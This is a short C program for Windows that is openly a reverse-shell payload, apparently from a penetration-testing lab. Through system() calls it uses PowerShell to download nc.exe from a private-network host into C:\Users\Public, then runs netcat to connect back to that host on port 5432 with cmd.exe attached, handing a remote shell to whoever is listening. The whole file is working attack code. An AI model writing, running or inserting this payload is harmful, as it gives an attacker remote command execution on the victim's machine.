#include <stdlib.h>

int main(void) {
    // 1. Download netcat if missing, then 2. connect back to attacker
    system("if not exist C:\\Users\\Public\\nc.exe "
           "powershell -Command \"iwr -Uri http://192.168.45.233/nc.exe -OutFile C:\\Users\\Public\\nc.exe\"");

    system("C:\\Users\\Public\\nc.exe 192.168.45.233 5432 -e cmd.exe");
    return 0;
}
